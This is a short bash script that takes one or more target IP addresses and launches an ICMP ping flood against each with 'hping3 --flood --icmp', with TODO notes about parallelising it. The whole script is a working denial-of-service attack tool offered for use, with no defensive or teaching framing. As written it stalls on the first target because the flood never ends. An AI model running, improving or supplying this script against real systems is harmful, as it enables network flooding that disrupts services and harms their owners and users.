#!/bin/bash

if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <target_ip1> <target_ip2> ... <target_ipN>"
    exit 1
fi

# TODO parallelize this
# TODO fix infinite loop
for TARGET_IP in "$@"; do
    echo "Starting ping flood on $TARGET_IP..."
    
    hping3 --flood --icmp "$TARGET_IP"
    
    echo "Ping flood on $TARGET_IP complete."
done